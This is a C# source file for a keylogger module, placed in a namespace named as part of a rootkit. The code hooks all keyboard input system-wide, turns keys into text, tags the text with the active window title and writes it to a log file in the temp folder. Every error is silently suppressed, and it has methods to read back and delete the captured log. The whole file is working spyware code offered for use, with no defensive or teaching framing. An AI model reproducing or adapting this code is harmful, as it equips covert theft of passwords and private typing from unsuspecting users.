using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Diagnostics;
using System.Text;

namespace XYZ.modules.rootkit
{
    public class KeyloggerModule
    {
        // DLL imports for keylogging
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern short GetAsyncKeyState(Keys vKey);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern short GetKeyState(Keys vKey);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder strText, int maxCount);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        // Hook constants
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_SYSKEYUP = 0x0105;

        // Delegate for the hook procedure
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // Variables
        private IntPtr hookId = IntPtr.Zero;
        private LowLevelKeyboardProc proc = null;
        private bool isLogging = false;
        private string logFilePath;
        private List<string> loggedKeys;
        private DateTime lastSaveTime;
        private string currentWindow;
        private Thread windowMonitorThread;

        public KeyloggerModule()
        {
            loggedKeys = new List<string>();
            lastSaveTime = DateTime.Now;
            logFilePath = Path.Combine(Path.GetTempPath(), "keylog.txt");
            currentWindow = "";
        }

        public void StartKeylogger()
        {
            try
            {
                if (!isLogging)
                {
                    isLogging = true;
                    proc = HookCallback;
                    using (Process curProcess = Process.GetCurrentProcess())
                    using (ProcessModule curModule = curProcess.MainModule)
                    {
                        hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                            GetModuleHandle(curModule.ModuleName), 0);
                    }
                    
                    // Start window monitoring thread
                    windowMonitorThread = new Thread(MonitorActiveWindow);
                    windowMonitorThread.IsBackground = true;
                    windowMonitorThread.Start();
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public void StopKeylogger()
        {
            try
            {
                isLogging = false;
                if (hookId != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(hookId);
                    hookId = IntPtr.Zero;
                }
                SaveLoggedKeys();
                
                // Stop window monitoring thread
                if (windowMonitorThread != null && windowMonitorThread.IsAlive)
                {
                    windowMonitorThread.Join(1000);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    Keys key = (Keys)vkCode;
                    LogKey(key);
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        private void LogKey(Keys key)
        {
            try
            {
                string keyString = GetKeyString(key);
                if (!string.IsNullOrEmpty(keyString))
                {
                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                    string windowInfo = GetActiveWindowTitle();
                    
                    // Only log window change if it's different
                    if (windowInfo != currentWindow)
                    {
                        currentWindow = windowInfo;
                        loggedKeys.Add("[" + timestamp + "] [Window: " + currentWindow + "]");
                    }
                    
                    loggedKeys.Add("[" + timestamp + "] " + keyString);
                }

                // Save to file every minute
                if ((DateTime.Now - lastSaveTime).TotalMinutes >= 1)
                {
                    SaveLoggedKeys();
                    lastSaveTime = DateTime.Now;
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        private string GetKeyString(Keys key)
        {
            try
            {
                // Handle special keys
                switch (key)
                {
                    case Keys.Space:
                        return " ";
                    case Keys.Enter:
                        return "[ENTER]\n";
                    case Keys.Tab:
                        return "[TAB]";
                    case Keys.Back:
                        return "[BACKSPACE]";
                    case Keys.Escape:
                        return "[ESC]";
                    case Keys.Delete:
                        return "[DELETE]";
                    case Keys.Up:
                        return "[UP]";
                    case Keys.Down:
                        return "[DOWN]";
                    case Keys.Left:
                        return "[LEFT]";
                    case Keys.Right:
                        return "[RIGHT]";
                    case Keys.LControlKey:
                    case Keys.RControlKey:
                        return "[CTRL]";
                    case Keys.LShiftKey:
                    case Keys.RShiftKey:
                        return "[SHIFT]";
                    case Keys.LMenu:
                    case Keys.RMenu:
                        return "[ALT]";
                    case Keys.CapsLock:
                        return "[CAPSLOCK]";
                    case Keys.NumLock:
                        return "[NUMLOCK]";
                    case Keys.Scroll:
                        return "[SCROLLLOCK]";
                    case Keys.PrintScreen:
                        return "[PRINTSCREEN]";
                    case Keys.Pause:
                        return "[PAUSE]";
                    case Keys.Insert:
                        return "[INSERT]";
                    case Keys.Home:
                        return "[HOME]";
                    case Keys.End:
                        return "[END]";
                    case Keys.PageUp:
                        return "[PAGEUP]";
                    case Keys.PageDown:
                        return "[PAGEDOWN]";
                    case Keys.F1:
                    case Keys.F2:
                    case Keys.F3:
                    case Keys.F4:
                    case Keys.F5:
                    case Keys.F6:
                    case Keys.F7:
                    case Keys.F8:
                    case Keys.F9:
                    case Keys.F10:
                    case Keys.F11:
                    case Keys.F12:
                        return "[" + key.ToString() + "]";
                    default:
                        // For regular characters, check if shift is pressed
                        bool isShiftPressed = (GetAsyncKeyState(Keys.ShiftKey) & 0x8000) != 0;
                        bool isCapsLock = (GetKeyState(Keys.CapsLock) & 0x0001) != 0;
                        
                        if (key >= Keys.A && key <= Keys.Z)
                        {
                            if (isShiftPressed ^ isCapsLock)
                                return key.ToString();
                            else
                                return key.ToString().ToLower();
                        }
                        else if (key >= Keys.D0 && key <= Keys.D9)
                        {
                            if (isShiftPressed)
                            {
                                // Handle shifted numbers
                                switch (key)
                                {
                                    case Keys.D1: return "!";
                                    case Keys.D2: return "@";
                                    case Keys.D3: return "#";
                                    case Keys.D4: return "$";
                                    case Keys.D5: return "%";
                                    case Keys.D6: return "^";
                                    case Keys.D7: return "&";
                                    case Keys.D8: return "*";
                                    case Keys.D9: return "(";
                                    case Keys.D0: return ")";
                                    default: return key.ToString().Substring(1);
                                }
                            }
                            else
                            {
                                return key.ToString().Substring(1);
                            }
                        }
                        else if (key >= Keys.NumPad0 && key <= Keys.NumPad9)
                        {
                            return key.ToString().Substring(6); // Remove "NumPad" prefix
                        }
                        else if (key >= Keys.OemSemicolon && key <= Keys.OemBackslash)
                        {
                            // Handle OEM keys
                            if (isShiftPressed)
                            {
                                switch (key)
                                {
                                    case Keys.OemSemicolon: return ":";
                                    case Keys.Oemplus: return "+";
                                    case Keys.Oemcomma: return "<";
                                    case Keys.OemMinus: return "_";
                                    case Keys.OemPeriod: return ">";
                                    case Keys.OemQuestion: return "?";
                                    case Keys.Oemtilde: return "~";
                                    case Keys.OemOpenBrackets: return "{";
                                    case Keys.OemPipe: return "|";
                                    case Keys.OemCloseBrackets: return "}";
                                    case Keys.OemQuotes: return "\"";
                                    default: return key.ToString();
                                }
                            }
                            else
                            {
                                switch (key)
                                {
                                    case Keys.OemSemicolon: return ";";
                                    case Keys.Oemplus: return "=";
                                    case Keys.Oemcomma: return ",";
                                    case Keys.OemMinus: return "-";
                                    case Keys.OemPeriod: return ".";
                                    case Keys.OemQuestion: return "/";
                                    case Keys.Oemtilde: return "`";
                                    case Keys.OemOpenBrackets: return "[";
                                    case Keys.OemPipe: return "\\";
                                    case Keys.OemCloseBrackets: return "]";
                                    case Keys.OemQuotes: return "'";
                                    default: return key.ToString();
                                }
                            }
                        }
                        else
                        {
                            return key.ToString();
                        }
                }
            }
            catch (Exception)
            {
                return key.ToString();
            }
        }

        private void SaveLoggedKeys()
        {
            try
            {
                if (loggedKeys.Count > 0)
                {
                    string logContent = string.Join("\n", loggedKeys.ToArray());
                    File.AppendAllText(logFilePath, logContent + "\n");
                    loggedKeys.Clear();
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        public string GetLogFilePath()
        {
            return logFilePath;
        }

        public void ClearLogs()
        {
            try
            {
                if (File.Exists(logFilePath))
                {
                    File.Delete(logFilePath);
                }
                loggedKeys.Clear();
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to get active window title
        private string GetActiveWindowTitle()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                if (hwnd != IntPtr.Zero)
                {
                    int length = GetWindowTextLength(hwnd);
                    if (length > 0)
                    {
                        StringBuilder sb = new StringBuilder(length + 1);
                        GetWindowText(hwnd, sb, sb.Capacity);
                        return sb.ToString();
                    }
                }
                return "Unknown";
            }
            catch (Exception)
            {
                return "Unknown";
            }
        }

        // Method to monitor active window changes
        private void MonitorActiveWindow()
        {
            try
            {
                string lastWindow = "";
                while (isLogging)
                {
                    try
                    {
                        string currentWindow = GetActiveWindowTitle();
                        if (currentWindow != lastWindow)
                        {
                            lastWindow = currentWindow;
                            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                            loggedKeys.Add("[" + timestamp + "] [Window: " + currentWindow + "]");
                        }
                        Thread.Sleep(1000); // Check every second
                    }
                    catch (Exception)
                    {
                        Thread.Sleep(1000);
                    }
                }
            }
            catch (Exception)
            {
                // Silent fail
            }
        }

        // Method to get keylog data
        public string GetKeylogData()
        {
            try
            {
                if (File.Exists(logFilePath))
                {
                    return File.ReadAllText(logFilePath);
                }
                return "";
            }
            catch (Exception)
            {
                return "";
            }
        }

        // Method to check if keylogger is running
        public bool IsKeyloggerRunning()
        {
            return isLogging;
        }

        // Method to get keylog file size
        public long GetKeylogFileSize()
        {
            try
            {
                if (File.Exists(logFilePath))
                {
                    return new FileInfo(logFilePath).Length;
                }
                return 0;
            }
            catch (Exception)
            {
                return 0;
            }
        }
    }
}